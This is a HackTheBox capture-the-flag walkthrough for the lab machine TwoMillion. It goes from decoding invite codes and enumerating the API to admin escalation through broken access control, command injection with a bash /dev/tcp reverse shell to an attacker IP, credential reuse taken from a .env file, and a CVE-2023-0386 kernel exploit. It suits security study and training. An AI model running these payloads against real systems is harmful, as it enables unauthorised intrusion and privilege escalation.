<div align="center">
<img src="attachments/Pasted%20image%2020260525132758.png">
</div>

[Machine Page](https://app.hackthebox.com/machines/TwoMillion?sort_by=created_at&sort_type=desc) <br>**Difficulty:** Easy<br>**Os:** Linux<br>**CVEs Exploited:** CVE-2023-0386 (OverlayFS / FUSE privilege escalation)<br>**Topics:** JS source analysis, ROT13 / Base64 decoding, API enumeration, Broken access control, Command injection, Password reuse, Linux kernel LPE

**By:** [https://app.hackthebox.com/users/2727685](https://app.hackthebox.com/users/2727685)

---

## Overview

TwoMillion is an Easy-difficulty Linux machine themed around the early HackTheBox platform. The attack chain begins with client-side JavaScript analysis to reverse-engineer an invite-code generation mechanism, which allows registration on the site. Once authenticated, API route enumeration exposes an administrative endpoint that lacks proper authorisation checks. Supplying a crafted PUT request elevates our account to admin, which in turn unlocks a VPN-generation endpoint vulnerable to OS command injection. A reverse shell lands us as www-data; database credentials in a .env file enable lateral movement to the admin OS user via password reuse. Finally, a mail hint points to CVE-2023-0386, an OverlayFS / FUSE privilege escalation vulnerability present in the running kernel, which yields a root shell.

---

## Reconnaissance

Let's discover open ports to evaluate attack vectors.

```shell
$ nmap -sV -sC -F 10.129.229.66
```

```shell
nmap -sV -sC -F 10.129.229.66

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 09:17 +0200
Nmap scan report for 10.129.229.66
Host is up (0.13s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Scan reveals ports 22 and 80 open.
	20 > SSH
	80 > Website (2million.htb)

```
echo `10.129.229.66 2million.htb` | sudo tee -a /etc/hosts
```

---
## Initial Enumeration

<img src="attachments/Pasted%20image%2020260526103903.png">

Browsing to http://2million.htb/ presents a replica of the old Hack The Box landing page. The only interactive routes available to an unauthenticated visitor are:

- /invite — reached via the Join button
    
- /login — standard email/password login form

which take you to these endpoints respectively: `/invite` and `/login`
First we should take a look into the login page.

<img src="attachments/Pasted%20image%2020260526130947.png">

This login form appears to perform verification using an email/password combination rather than the standard username/password format we are used to seeing. As a result, obtaining access through default credentials is less likely, since email addresses and their formats are generally harder to guess. Therefore, we need to shift our focus. Taking a look at the source code behind a page is always advised before moving on.

```shell
$ curl http://2million.htb/login
```

In the last bit you can spot some JavaScript.

```js
    <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script>
        $(document).ready(function() {
            localStorage.removeItem('inviteCode');
        });
    </script>

```

>[!NOTE]
> _Penetration testers should always inspect the JavaScript source of a webpage, as it can reveal hidden endpoints, API routes, hardcoded credentials, authentication logic, developer comments, or other sensitive functionality that is not immediately visible through the user interface alone._

The code snippet above confirms there is an **invite code system** on this site. It also tells us that the invite code is stored in `localStorage`, meaning client side.

With this information we move on to the `/invite` endpoint.

<img src="attachments/Pasted%20image%2020260526143251.png">

A quick review of the page source reveals a number of hints left by the developers. Comments such as `<!-- scripts -->` immediately draw attention toward the JavaScript resources loaded by the page, making them a natural next step in the enumeration process.

```js
< script src="/js/htb-frontend.min.js"></script> 
<script defer src="/js/inviteapi.min.js"></script> 
<script defer>
    $(document).ready(function () {
        $('#verifyForm').submit(function (e) {
            e.preventDefault();

            var code = $('#code').val();
            var formData = {
                "code": code
            };

            $.ajax({
                type: "POST",
                dataType: "json",
                data: formData,
                url: '/api/v1/invite/verify',
                success: function (response) {
                    if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {

                        localStorage.setItem('inviteCode', code);

                        window.location.href = '/register';
                    } else {
                        alert("Invalid invite code. Please try again.");
                    }
                },
                error: function (response) {
                    alert("An error occurred. Please try again.");
                }
            });
        });
    }); <
/script>
```

There are 3 separate scripts:
`htb-frontend.min.js` is the general front-end code which is shared with the login page as well.
`inviteapi.min.js` this is new and specific to this page. As the name suggests it is a dedicated JavaScript file just for the invite API.
	`defer` on both script tags means they load **after** the HTML is parsed but before the page is fully ready.

### Inline code

```js
$(document).ready(function() {
```

jQuery statement that tells the browser to wait until `document` is **ready** ( `(document).ready` ) to call this the code inside the function.

```js
$('#verifyForm').submit(function(e) {
    e.preventDefault();
```

Targets the HTML element with id="verifyForm". `.submit(function(e)` runs the function when the form is submitted. `e.preventDefault()` stops the form from doing its default behavior ( which would be a full page reload POST request)

```js
var code = $('#code').val();
var formData = { "code": code };
```

`$('#code').val()` gets the value of the input field with id="code" and stores it in a variable called `code`
Wraps it in a JSON object `{"code": "whatever_the_user_typed"}`

This tells us that the API expects a single key called "code". So to interact with this API manually:

```shell
curl -s -X POST http://2million.htb/api/v1/invite/verify \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-d "code=TESTCODE"
```

#### The AJAX request

```js
$.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
```

`type: "POST"` - HTTP method is POST
`dataType: "json"` - expects a JSON response back from the server
`data: formData` - sends the JSON object created earlier `{"code": "user_input"}`
`url: '/api/v1/invite/verify'` - the API endpoint revealed

#### On success:

```js
localStorage.setItem('inviteCode', code);
window.location.href = '/register';
```

`localStorage.setItem('inviteCode', code)`  saves the valid invite code to the browser's localStorage under the key `inviteCode`
`window.location.href = '/register'` redirects to `/register`





Checking out `2million.htb/js/inviteapi.min.js`, its obfuscated but deobfuscated looks like this:
```json
function verifyInviteCode(code) {

    var formData = {
        "code": code
    };

    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',

        success: function(response) {
            console.log(response);
        },

        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {

    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',

        success: function(response) {
            console.log(response);
        },

        error: function(response) {
            console.log(response);
        }
    });
}
```

Important here is makeInviteCode, which makes a POST request to `2million.htb/api/v1/invite/how/to/generate` and logs that. Lets curl to see what we get from that.

```shell
$ curl -X POST 2million.htb/api/v1/invite/how/to/generate 

{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."} 
```

The data holds some cryptographic human-readable string. By the remaining spaces, unchanged symbols/punctuation marks (in this case the **/** forward slash) being unchanged, and the words appearing to have normal-word length, we can deduce that this is some type of rotation. 

>[!NOTE]
_>When facing encrypted text, be on the lookout for characteristis that might set this cryptographic rule used aside from the rest. Each has it's different ways to associate. In the above examples, all that were mentioned were clear examples of a rotation encryption which put it aside from other methods._

Our conclusion is also backed up by the `enctype` parameter (standing for encryption type), which holds the value ROT13. 

Back to the Walk-through. The next logical step for us is to decode the hidden message (as we were instructed by the hint parameter - THX MACHINE CREATORS!)

Many simple decoders can be found online, all getting the job done. I used the decoder hardlinked [here](https://cryptii.com/pipes/rot13-decoder/).

<img src="attachments/Pasted%20image%2020260526213741.png">

```shell
└─$ curl -X POST 2million.htb/api/v1/invite/generate       
{"0":200,"success":1,"data":{"code":"WlVLTjctTEVGSkQtQVZWSlctQ0g2QzY=","format":"encoded"}}
```

Recall the NOTE above this one. As the format suggests, this is yet another encoded string. This time we are not dealing with a rotation. By the characteristics of `WlVLTjctTEVGSkQtQVZWSlctQ0g2QzY=`
- upper and lowercase letters
- digits
- "=" for padding (usually at the beginning or end of the string)
We are most likely dealing with a base64 encoded string. Let's decode it and check.

```shell
$ echo WlVLTjctTEVGSkQtQVZWSlctQ0g2QzY= | base64 -d         
ZUKN7-LEFJD-AVVJW-CH6C6 
```

`ZUKN7-LEFJD-AVVJW-CH6C6` is our code. Lets try that over at `/invite`.
It is accepted, what is left to do is signing up to the platform with credentials of our chosing then logging in.

Entering it the `/invite` endpoint is successful. Now we login via the credentials we created and access the dashboard

<img src="attachments/Pasted%20image%2020260526230440.png">

Looking at the panel on the left, watching out for links that redirect us to a new page by hovering over them, we see that we can explore `Change log` and `Access`, from which Change long just gives us  old change longs of the HTB platform, dating back to 2017 with the new features they were adding back then, and the Access tab letting us view the Lab Access Details and also regenerate/download the connection pack (VPN)

Here is a good way to check for usability without interacting with any buttons first:

<img src="attachments/2million_htb.gif">

This clearly shows us which buttons:
1. Do nothing
2. Redirect us to the main page
3. Redirect us to a new page to explore

---

## API Enumeration

From the looks of it they send us to `api/v1/users/vpn/generate` and `api/v1/users/vpn/regenerate`. Let's check these endpoints using Burpsuite to explore them further. Open the application while relaying web traffic to burp on proxy Interception mode on, and interact with the buttons. Grab one of the requests and send them to the repeater.

<img src="attachments/Pasted%20image%2020260527145426.png">

Since the application exposes multiple API endpoints, it is worth testing whether the parent routes disclose additional functionality. Developers sometimes leave route enumeration endpoints accessible, which can significantly expand the attack surface.

<img src="attachments/Pasted%20image%2020260527145624.png">

Nothing on `/api/v1/users/vpn`.

<img src="attachments/Pasted%20image%2020260527145702.png">

Same with `api/v1/user`.

<img src="attachments/Pasted%20image%2020260527145745.png">

Requesting `/api/v1` reveals a route listing endpoint that discloses both user and administrative API functionality. This immediately expands the available attack surface and provides several options for privilege escalation testing., (probably provided we now have a valid Cookie parameter within our request, trying this before login wouldn't work).

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 12:57:26 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{
  "v1":{
    "user":{
      "GET":{
        "\/api\/v1":"Route List",
        "\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation",
        "\/api\/v1\/invite\/generate":"Generate invite code",
        "\/api\/v1\/invite\/verify":"Verify invite code",
        "\/api\/v1\/user\/auth":"Check if user is authenticated",
        "\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration",
        "\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration",
        "\/api\/v1\/user\/vpn\/download":"Download OVPN file"
      },
      "POST":{
        "\/api\/v1\/user\/register":"Register a new user",
        "\/api\/v1\/user\/login":"Login with existing user"
      }
    },
    "admin":{
      "GET":{
        "\/api\/v1\/admin\/auth":"Check if user is admin"
      },
      "POST":{
        "\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"
      },
      "PUT":{
        "\/api\/v1\/admin\/settings\/update":"Update user settings"
      }
    }
  }
}
```

It outputs a list of API endpoints/routes we can access. Immediately we notice `admin`'s endpoints which we haven't seen before. 

Testing the first one to see how it checks if the user is admin or not.

Below are the types of requests and the api endpoints they were tested on:

GET /api/v1/user/auth HTTP/1.1

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 13:26:29 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 48

{
  "loggedin":true,
  "username":"user",
  "is_admin":0
}
```


GET /api/v1/admin/auth HTTP/1.1

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 13:28:36 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 17

{
  "message":false
}
```

PUT /api/v1/admin/settings/update HTTP/1.1

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 13:29:53 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53

{"status":"danger","message":"Invalid content type."}
```


When we send a GET request to /adim/auth again:

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 13:30:30 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 17

{
  "message":false
}
```

Still we remain a normal user and not an admin.

What caught my eye was the GET request we made to `/user/auth`.
It had the same purpose with `/admin/auth`, verifying if the user is an admin or not, but it does so in a different way. In contrast with the `/admin/auth` endpoint that verifies the status via e message reply from the server (=="message":false==), `/user/auth` does it by a parameter (=="is_admin":0==).

The first thing I thought of trying was logging in with the new parameter we discovered in the body of the request and with the positive value on (1).

```json
POST /api/v1/user/login HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://2million.htb
Connection: keep-alive
Referer: http://2million.htb/login
Cookie: PHPSESSID=ntliu98ghjeldgn56akvf0hpjp
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=user%40email.com&password=user&is_admin=1
```

But we sill get `"is_admin":0` and `"message":false`

Since it's likely our account is perma-locked as a normal user, I want to try creating a new account to see if it has the "is_admin" parameter, for that well need to fetch a new invite code , and make a new account via `/register`.

(After trying)
Still didn't work. Going back to `/api/v1/admin/settings/update `
request. Our response was 

```json
"status":"danger",
"message":"Invalid content type."
```

Probably because we are missing our Content-Type header.

The API's error messages proved highly informative. By progressively satisfying the required parameters reported by the server, it became apparent that the endpoint accepted both an `email` and an `is_admin` field. Since no authorization checks were performed, supplying our account email alongside `"is_admin": 1` resulted in privilege escalation

The finalized request should look similar to this :
```json
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=ntliu98ghjeldgn56akvf0hpjp
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 45

{
  "email":"admin@email.com",
  "is_admin":1
}
```
	Added content-type, email par and is_admin par.
	
And our response is:

```json
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 May 2026 14:19:55 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 41

{
  "id":14,
  "username":"admin",
  "is_admin":1
}
```

Now we GET /api/v1/admin/auth HTTP/1.1 to verify 

![](attachments/Pasted%20image%2020260527162451.png)

We are now an admin.

---

## Remote Code Execution via VPN Generation Endpoint

With administrative privileges obtained, the next step was to investigate the functionality exposed by the administrative API endpoints. One particularly interesting route was `/api/v1/admin/vpn/generate`, which appeared to generate VPN configuration files for users.

An initial request to the endpoint resulted in an error indicating an invalid content type. After supplying the appropriate `Content-Type: application/json` header and providing the required `username` parameter, the endpoint processed our request successfully.

During testing, it became apparent that user-supplied input was being incorporated into a backend command without proper sanitization. To verify this suspicion, a time-based payload was submitted:

```json
{
  "username":"admin$(sleep 10)"
}
```

The resulting delay in the server's response confirmed that command substitution was occurring, demonstrating the presence of a command injection vulnerability. Since arbitrary commands could now be executed on the target system, remote code execution (RCE) had effectively been achieved.

To obtain an interactive shell, a Bash reverse shell payload was embedded within the vulnerable parameter:

```json
{
  "username":"admin$(bash -c 'bash -i >& /dev/tcp/10.10.16.51/4444 0>&1')"
}
```

After starting a listener on the attacking machine, the target connected back and provided a shell as the `www-data` user.

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.51] from (UNKNOWN) [10.129.6.252] 42418
bash: cannot set terminal process group (1093): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```

Upgrade your shell.

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl-Z

stty raw -echo; fg

export TERM=xterm
```

---

## Post-Exploitation Enumeration

### **Credentials from .env**

The web root contains a .env file with database credentials in plaintext:

```shell
www-data@2million:~/html$ cat /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ 
```

### **Database Inspection**

Although www-data is denied direct MySQL access, we can authenticate using the recovered credentials:

```shell
www-data@2million:/tmp$ mysql -u admin -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 151
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb_prod           |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use htb_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb_prod]> show tables;
+--------------------+
| Tables_in_htb_prod |
+--------------------+
| invite_codes       |
| users              |
+--------------------+
2 rows in set (0.000 sec)

```

```sql
MariaDB [htb_prod]> select * from users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | user         | user@email.com             | $2y$10$KlEJOm87xAfcJE43Xr2nMOPqqKJtV0Dymr51udJl2lMh8XR51JP6q |        0 |
| 14 | admin        | admin@email.com            | $2y$10$eiMPwdP1VN5dEMkQZzqJlO.BGphGhfGQ.6p/ORlmZVI7kRrQ1JOOq |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
```

### Lateral Movement

The hashed passwords are stored as **bcrypt hashes**. Rather than attempting to crack them, we test whether the database password has been reused for the OS-level admin account.

```shell
su -i admin
```

password : `SuperDuperPass123`

```shell
admin@2million:~$ id

uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

---
## User flag

```shell
admin@2million:~$ cat ~/user.txt
<user flag>
```

The credentials are reused and we obtain the user flag. Password reuse between service accounts and OS accounts is a common, high-impact misconfiguration.

---

## Privilege Escalation - CVE-2023-0386 (OverlayFS / FUSE)

Checking the mail spool reveals an internal message addressed to admin from "HTB Godfather", a hint left by the machine creator:

```shell
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

The reference to **OverlayFS/FUSE** points directly to [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386). We confirm the kernel version is vulnerable: 

```shell
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel 5.15.70 predates the patch for CVE-2023-0386, which was introduced in 5.15.x stable updates in early 2023.

>[!NOTE]
**CVE-2023-0386**
_This vulnerability is a flaw in the Linux kernel's OverlayFS implementation. When a FUSE filesystem is mounted inside a user namespace and merged via OverlayFS, the kernel fails to properly validate file capabilities during a copy-up operation. An unprivileged user can exploit this to copy a setuid-root binary into a location accessible from the host, then execute it to obtain root privileges. It affects kernels prior to approximately 6.2 and select 5.x stable branches before their respective backported patches._

We clone the public proof-of-concept on our attack machine, archive it, and transfer it to the target over **SCP** using the admin SSH credentials:

```shell
git clone https://github.com/xkaneiki/CVE-2023-0386

zip -r cve.zip CVE-2023-0386

scp cve.zip admin@2million.htb:/tmp

admin@2million.htb's password: SuperDuperPass123
```

On the target we unpack the archive, compile the three components, and trigger the exploit in two steps — first launching the FUSE daemon in the background, then running the main exploit binary:

```shell
admin@2million:/tmp$ unzip cve.zip
admin@2million:/tmp$ cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ make all

gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc -o exp exp.c -lcap
gcc -o gc getshell.c

admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 3013
[+] len of gc: 0x3ee0

admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback /file
-rwsrwxrwx 1 nobody nogroup 16096 Jan 1 1970 file
[+] read buf callback — offset 0, size 16384, path /file
[+] ioctl callback — path /file, cmd 0x80086601
[+] exploit success!

root@2million:/tmp/CVE-2023-0386# whoami
root
```

---

## Root Flag

```shell
root@2million:/tmp/CVE-2023-0386# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json

root@2million:/root# cat root.txt
<root flag>
```


---

## Summary


| Step | Action               | Tool/Technique                |
| ---- | -------------------- | ----------------------------- |
| 1    | Port Scan            | nmap                          |
| 2    | Website Enumeration  | Reverse engineering           |
| 3    | API Enumeration      | curl + Burpsuite              |
| 4    | RCE on JS function   | curl +                        |
| 5    | System Enumeration   | Plaintext credentials + MySQL |
| 6    | User Flag            | Readable from /admin/user.txt |
| 7    | Privilege Escalation | CVE-2023-0386                 |
| 8    | Root Flag            | Readable from /root/root.txt  |

---

![](attachments/Pasted%20image%2020260601234519.png)

